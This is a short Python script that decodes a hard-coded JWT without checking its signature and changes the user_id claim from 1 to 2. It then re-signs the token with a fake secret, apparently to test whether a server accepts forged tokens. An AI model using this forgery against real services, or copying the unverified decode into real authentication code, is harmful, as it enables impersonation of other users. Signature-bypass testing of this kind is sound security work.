import jwt

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3NzUyODQwNDl9.n5sXICG4cG7IBAZ5B1bD0NUrZ4flmI-kF_E5GeRcKCw'

payload = jwt.decode(token, options={'verify_signature': False})
print(f"Original: {payload}")

payload['user_id']=2

tampered = jwt.encode(payload, 'fakesecret', algorithm='HS256')
print(f"Tamper Token: {tampered}")
